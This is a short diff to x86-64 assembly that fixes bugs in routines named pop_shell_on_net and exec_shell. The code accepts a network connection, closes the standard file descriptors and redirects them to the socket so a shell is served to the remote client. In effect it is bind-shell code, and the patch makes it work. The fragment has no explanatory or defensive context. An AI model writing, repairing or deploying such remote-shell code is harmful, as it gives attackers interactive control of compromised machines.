@@ -386,7 +386,7 @@ pop_shell_on_net:
 	mov DWORD[rsp + 8], 16; len = sizeof(struct sockaddr_in)
 	mov rax, 43
 	lea rsi, [rsp + 12]
-	lea rdi, [rsp + 8]
+	lea rdx, [rsp + 8]
 	syscall; rax = accept(sockfd, (struct sockaddr*)&cli, &len)
 	cmp rax, -1
 	je exit_prog; err
@@ -394,6 +394,7 @@ pop_shell_on_net:
 	; at this point our server is running and has accepted a client
 	xor rdi, rdi
 	mov edi, DWORD[rsp + 4]; pass connfd as param
+
 	call exec_shell
 	add rsp, 12
 	add rsp, 32
@@ -413,6 +414,7 @@ exec_shell:
 	mov QWORD[rsp + 8], rbx; argvs[1] = NULL
 	sub rsp, 8
 	mov QWORD[rsp], rbx; envp = {NULL}
+	push rdi
 	mov rax, 3
 	mov rdi, 0
 	syscall;close(0)
@@ -422,6 +424,7 @@ exec_shell:
 	mov rax, 3
 	mov rdi, 2
 	syscall;close(2)
+	pop rdi
 	;redirect fds
 	mov rax, 33
 	mov rsi, 0
